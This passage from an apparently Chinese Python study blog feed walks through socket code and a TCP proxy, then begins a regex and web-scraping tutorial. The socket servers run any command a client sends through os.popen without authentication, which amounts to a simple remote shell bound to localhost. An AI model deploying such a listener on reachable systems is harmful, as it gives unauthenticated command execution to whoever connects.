class="line">        sock.send(str.encode(result))</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>))</span><br><span class="line">text = c.recv(<span class="number">1024</span>)</span><br><span class="line">print(bytes.decode(text))</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    cmd = input(<span class="string">'Please input a command: '</span>)</span><br><span class="line">    c.send(str.encode(cmd))</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">        c.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = c.recv(<span class="number">1024</span>)</span><br><span class="line">    print(bytes.decode(result))</span><br></pre></td></tr></table></figure><p>当客户端输入exit时，断开与服务器的连接。同样的，这里的服务器端还是只能与一个客户端连接</p><h2 id="利用threading库实现多线程连接"><a href="#利用threading库实现多线程连接" class="headerlink" title="利用threading库实现多线程连接"></a>利用threading库实现多线程连接</h2><p>服务器端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ThreadHandle</span><span class="params">(sock,addr)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        cmd = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        cmd = bytes.decode(cmd)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">            print(addr,<span class="string">'has lost'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result = os.popen(cmd).read()</span><br><span class="line">        sock.send(str.encode(result))</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'localhost'</span>,<span class="number">6666</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">    sock.send(str.encode(<span class="string">'Welcome to SSHServer!'</span>))</span><br><span class="line">    t = Thread(target=ThreadHandle,args=(sock,addr))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>))</span><br><span class="line">text = c.recv(<span class="number">1024</span>)</span><br><span class="line">print(bytes.decode(text))</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    cmd = input(<span class="string">'Please input a command: '</span>)</span><br><span class="line">    c.send(str.encode(cmd))</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">        c.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = c.recv(<span class="number">1024</span>)</span><br><span class="line">    print(bytes.decode(result))</span><br></pre></td></tr></table></figure><p>服务器端使用了threading标准库的Thread函数开启了多线程，即每个连接都是一个单独的进程</p><h2 id="模拟TCP代理"><a href="#模拟TCP代理" class="headerlink" title="模拟TCP代理"></a>模拟TCP代理</h2><p>我们假设服务器与客户端因为某种原因不能直接通信，这时候就需要一个中间的代理将客户端的信息转发到服务器，再接收服务器返回的数据再转发给客户端，这就是代理的原理</p><p>如果我们把Python中一个socket代表一个连接，那么代理既要与客户端连接又要与服务器连接，就需要两个socket</p><p>我们先来编写服务器端和客户端，跟前面的例子一样，不说明了</p><p>服务器端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'localhost'</span>,<span class="number">6666</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        cmd = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        cmd = bytes.decode(cmd)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">            print(<span class="string">'TCPClient has lost'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result = os.popen(cmd).read()</span><br><span class="line">        sock.send(str.encode(result))</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = input(<span class="string">'Please input a PORT to connect: '</span>)</span><br><span class="line">PORT = int(PORT)</span><br><span class="line"></span><br><span class="line">c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">c.connect((HOST,PORT))</span><br><span class="line">text = c.recv(<span class="number">1024</span>)</span><br><span class="line">print(bytes.decode(text))</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    cmd = input(<span class="string">'Please input a command: '</span>)</span><br><span class="line">    c.send(str.encode(cmd))</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">        c.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = c.recv(<span class="number">1024</span>)</span><br><span class="line">    result = bytes.decode(result)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>接下来开始编写代理，首先我们先定义建立与客户端连接的socket的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Server</span><span class="params">(LPORT,CHOST,CPORT)</span>:</span></span><br><span class="line">    c = Client(CHOST,CPORT)</span><br><span class="line">    s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'localhost'</span>,LPORT))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">        sock.send(str.encode(<span class="string">'Welcome to TCPProxy!'</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            cmd = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> bytes.decode(cmd) == <span class="string">'exit'</span>:</span><br><span class="line">                print(<span class="string">'TCPClient '</span>+addr+<span class="string">' has lost'</span>)</span><br><span class="line">                Forward(c,cmd)</span><br><span class="line">                c.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">'The command from TCPClient is: '</span>+bytes.decode(cmd))</span><br><span class="line">            result = Forward(c,cmd)</span><br><span class="line">            print(<span class="string">'The result from TCPServer is: '</span>+bytes.decode(result))</span><br><span class="line">            sock.send(result)</span><br></pre></td></tr></table></figure><p>因为代理是接收客户端的数据再将数据转发至服务器，再把服务器返回的结果转发到客户端。所以我们不妨把代理看成是客户端的服务器，因此定义函数名为Server，等待客户端的连接，虽然它不然处理客户端发来的数据，但是它可以将数据转发服务器端让服务器端代为处理，这里的参数LPORT是代理绑定的端口号，CHOST和CPORT是传入Client函数的参数，也就是后面讲代理看作是客户端与服务器端连接。</p><p>与客户端建立连接后，接收客户端的数据打印出来后，将数据通过Forward函数转发至服务器端，当客户端输入exit命令时，代理将断开与服务器端的连接和客户端的连接并继续等待客户端的接入</p><p>接下来编写与服务器端连接的函数Client和转发数据的函数Forward</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Client</span><span class="params">(CHOST,CPORT)</span>:</span></span><br><span class="line">    c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    c.connect((CHOST,CPORT))</span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Forward</span><span class="params">(c,cmd)</span>:</span></span><br><span class="line">    c.send(cmd)</span><br><span class="line">    result = c.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>参数CHOST和CPORT是服务器端的IP和端口</p><p>再编写主函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        LPORT = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">        CHOST = sys.argv[<span class="number">2</span>]</span><br><span class="line">        CPORT = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">        Server(LPORT,CHOST,CPORT)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        usage()</span><br></pre></td></tr></table></figure><p>这里用到了sys标准库的sys.argv[]，简单地说就是我们在cmd中输入执行python程序时获取的参数，假如我们在cmd命令行中输入test.py aaa bbb，那么sys.argv[0]就代表了字符串’test.py’，sys.argv[1]代表了字符串’aaa’，同理sys.argv[2]代表了字符串’bbb’，所以我们要执行这个代理的程序，不仅要输入python程序的文件名，还要同时输入三个参数，否则就出错而执行usage函数，我们就定义usage函数为这个程序的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'TCPProxy.py [ListenedPORT] [ConnectedHOST] [ConnectedPORT]'</span>)</span><br></pre></td></tr></table></figure><p>说明了执行这个代理程序应当输入的格式</p><p>下面附上代理端完整的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'TCPProxy.py [ListenedPORT] [ConnectedHOST] [ConnectedPORT]'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Server</span><span class="params">(LPORT,CHOST,CPORT)</span>:</span></span><br><span class="line">    c = Client(CHOST,CPORT)</span><br><span class="line">    s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'localhost'</span>,LPORT))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">        sock.send(str.encode(<span class="string">'Welcome to TCPProxy!'</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            cmd = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> bytes.decode(cmd) == <span class="string">'exit'</span>:</span><br><span class="line">                print(<span class="string">'TCPClient '</span>+addr+<span class="string">' has lost'</span>)</span><br><span class="line">                Forward(c,cmd)</span><br><span class="line">                c.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">'The command from TCPClient is: '</span>+bytes.decode(cmd))</span><br><span class="line">            result = Forward(c,cmd)</span><br><span class="line">            print(<span class="string">'The result from TCPServer is: '</span>+bytes.decode(result))</span><br><span class="line">            sock.send(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Client</span><span class="params">(CHOST,CPORT)</span>:</span></span><br><span class="line">    c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    c.connect((CHOST,CPORT))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Forward</span><span class="params">(c,cmd)</span>:</span></span><br><span class="line">    c.send(cmd)</span><br><span class="line">    result = c.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        LPORT = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">        CHOST = sys.argv[<span class="number">2</span>]</span><br><span class="line">        CPORT = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">        Server(LPORT,CHOST,CPORT)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Python学习笔记
    
    </summary>
    
      <category term="Python学习笔记" scheme="https://Foxgrin.github.io/categories/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python正则表达式</title>
    <link href="https://Foxgrin.github.io//posts/26030/"/>
    <id>https://Foxgrin.github.io//posts/26030/</id>
    <published>2018-07-21T06:53:00.000Z</published>
    <updated>2018-07-21T14:22:28.172Z</updated>
    
    <content type="html"><![CDATA[<p>好久没复习Python了，感觉很多东西都快忘了，趁着假期赶紧补一补基础<a id="more"></a></p><h2 id="什么是正则"><a href="#什么是正则" class="headerlink" title="什么是正则"></a>什么是正则</h2><p>正则表达式使用单个字符串来描述，匹配一系列符合某个句法规则的字符串，简单理解，就是对字符串的检索匹配和处理</p><h2 id="Python-正则表达式"><a href="#Python-正则表达式" class="headerlink" title="Python 正则表达式"></a>Python 正则表达式</h2><p>Python通过re模块提供对正则表达式的支持</p><p>1.先将正则表达式的字符串形式编译为Pattern实例；</p><p>2.使用Pattern实例处理文本并获得匹配结果；</p><p>3.使用实例获得信息，进行其他的操作。</p><p>先熟知几个re模块常用的函数：</p><p>(1)re.compile(pattern,flags=0)</p><p>​    re.match(pattern,string,flags=0)</p><p>来看下面一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pattern = re.compile(<span class="string">'hello'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = pattern.match(<span class="string">'hello world'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(match.group())</span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>这个例子使用了re模块的compile函数生成一个正则表达式的pattern对象，该对象拥有一系列方法用于正则表达式的匹配和替换,简单而言就是规定了匹配的模式，而match函数则用来匹配，匹配成功则返回一个match对象，match对象通过group()返回被RE匹配的字符串</p><p>(2)re.findall(pattern,string,flags=0)</p><p>来看下面一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(<span class="string">'hello'</span>,<span class="string">'hello world'</span>)</span><br><span class="line">[<span class="string">'hello'</span>]</span><br></pre></td></tr></table></figure><p>这个例子使用了re模块的findall函数遍历匹配，可以获取字符串中所有匹配的字符串，返回一个列表，跟compile函数不同在于，findall函数能搜素出所有符合的字符串组成一个列表</p><p>(3)re.search(pattern,string,flags=0)</p><p>来看下面一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.search(<span class="string">'hello'</span>,<span class="string">'hello world'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match.group()</span><br><span class="line"><span class="string">'hello'</span></span><br></pre></td></tr></table></figure><p>这个例子使用了re模块的search函数，跟match函数一样，只找到第一个匹配的字符串然后返回一个match对象</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>抓取i春秋网页的课程信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python正则/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url=<span class="string">"https://www.ichunqiu.com/courses/webaq"</span></span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">'Host'</span>: <span class="string">'www.ichunqiu.com'</span>,</span><br><span class="line"><span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line"><span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.get(url,headers=header)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line">soup=BeautifulSoup(r.text,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取课程名称</span></span><br><span class="line">classname=[]</span><br><span class="line">l=soup.find_all(<span class="string">'div'</span>,class_=<span class="string">'coursename'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    classname.append(i[<span class="string">'title'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取课程价格</span></span><br><span class="line">cost=re.findall(<span class="string">r'\d*元|免费'</span>,str(soup))</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取课程课时和总时间</span></span><br><span class="line">time=re.findall(<span class="string">r'\d*课时\d*分钟'</span>,str(soup))</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取课程学习人数</span></span><br><span class="line">people=re.findall(<span class="string">r'\d*人学习'</span>,str(soup))</span><br><span class="line"></span><br><span class="line"><span class="comment">#整理课程所有信息</span></span><br><span class="line">classMessage=[]</span><br><span class="line">message=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    message.append(classname[i])</span><br><span class="line">    message.append(cost[i])</span><br><span class="line">    message.append(time[i])</span><br><span class="line">    message.append(people[i])</span><br><span class="line">    classMessage.append(message)</span><br><span class="line">    message=[]</span><br><span class="line">print(<span class="string">'&#123;0:30s&#125;\t&#123;1:8s&#125;\t&#123;2:15s&#125;\t&#123;3:15s&#125;'</span>.format(<span class="string">'课程名称'</span>,<span class="string">'价格'</span>,<span class="string">'课时及总时间'</span>,<span class="string">'学习人数'</span>,chr(<span class="number">12288</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> classMessage:</span><br><span class="line">    print(<span class="string">'&#123;0:30s&#125;\t&#123;1:8s&#125;\t&#123;2:15s&#125;\t&#123;3:15s&#125;'</span>.format(i[<span class="number">0</span>],i[<span class="number">1</span>],i[<span class="number">2</span>],i[<span class="number">3</span>],chr(<span class="number">12288</span>)))</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python正则/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后这里因为中文英文字符所占字节不同，所以死活对不齐…也利用了chr(12288)填充的办法还是行不通，希望有大神能告知如何解决，感激不尽</p><h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><table><thead><tr><th>一般字符</th><th>匹配自身</th><th>abc</th><th>abc</th></tr></thead><tbody><tr><td>.</td><td>匹配任意换行符”\n”以外的字符</td><td>a.c</td><td>abc</td></tr><tr><td>\</td><td>转义字符，是最后一个字符改变原来的意思。用于在正则表达式中转义一些特殊字符</td><td><code>a\.c</code> <code>a\\c</code></td><td>a.c       a\c</td></tr><tr><td>[…]</td><td>字符集。对应的位置可以是字符串集中任意1个字符。字符集中的字符可以逐个列出，也可以给出范围，如[abc]或[a-c]，第一个字符如果是^则表示取反，如<code>[^abc]</code>表示不是abc的其他字符。所有的特殊字符在字符集中都失去原来的特殊含义，在字符集中如果要使用]，-或^，可以在前面加上反斜杠</td><td>a[bcd]e</td><td>abe ace ade</td></tr></tbody></table><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><table><thead><tr><th>预定义字符（可以写在[…]中）</th><th>含义</th><th>例子</th><th>符合匹配的例子</th></tr></thead><tbody><tr><td>\d</td><td>数字：[0-9]</td><td>a\dc</td><td>a1c,a9c</td></tr><tr><td>\D</td><td>非数字：<code>[^\d]</code></td><td>a\Dc</td><td>abc,a c</td></tr><tr><td>\s</td><td>空白字符：[&lt;空格&gt;\t\r\f\v]</td><td>a\sc</td><td>a c</td></tr><tr><td>\S</td><td>非空白字符：<code>[^\s]</code></td><td>a\Sc</td><td>abc,a1c</td></tr><tr><td>\w</td><td>单词字符：[A-Za-z0-9]</td><td>a\wc</td><td>abc,a1c,aBc</td></tr><tr><td>\W</td><td>非单词字符：<code>[^\w]</code></td><td>a\Wc</td><td>a c,a.c</td></tr></tbody></table><h2 id="数量词"><a href="#数量词" class="headerlink" title="数量词"></a>数量词</h2><table><thead><tr><th>数量词</th><th>含义</th><th>例子</th><th>符合匹配的例子</th></tr></thead><tbody><tr><td>*</td><td>匹配前一次字符0次或无限次</td><td>abc*</td><td>ab,abccc</td></tr><tr><td>+</td><td>匹配前一个字符1次或无限次</td><td>abc+</td><td>abc,abccc</td></tr><tr><td>?</td><td>匹配前一个字符0次或1次</td><td>abc?</td><td>ab,abc</td></tr><tr><td>{m}</td><td>匹配前一个字符m次</td><td>ab{2}c</td><td>abbc</td></tr><tr><td>{m,n}</td><td>匹配前一个字符m到n次</td><td>ab{1,2}c</td><td>abc,abbc</td></tr></tbody></table><h2 id="逻辑，分组"><a href="#逻辑，分组" class="headerlink" title="逻辑，分组"></a>逻辑，分组</h2><table><thead><tr><th>字符</th><th>含义</th><th>例子</th><th>符合匹配的例子</th></tr></thead><tbody><tr><td>或运算符</td><td>代表左右表达式任意匹配一个，它总是先尝试匹配左边的表达式，一旦成功匹配则跳过右边的表达式，如果或运算符没有包括在()中，则它的范围是整个正则表达式</td><td>abc或def</td><td>abc          